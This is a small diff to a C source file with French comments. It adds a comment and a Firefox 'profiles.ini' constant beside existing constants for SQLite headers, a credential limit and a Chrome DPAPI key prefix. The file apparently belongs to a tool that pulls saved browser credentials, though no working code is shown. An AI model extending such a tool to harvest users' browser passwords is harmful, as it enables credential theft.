@@ -17,9 +17,11 @@
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "bcrypt.lib")
 
+/* Constantes */
 #define SQLITE_HEADER "SQLite format 3"
 #define MAX_CREDENTIALS 256
 #define CHROME_KEY_PREFIX "DPAPI"
+#define FIREFOX_PROFILES_FILE "profiles.ini"
 
 /* Fonctions utilitaires */
 
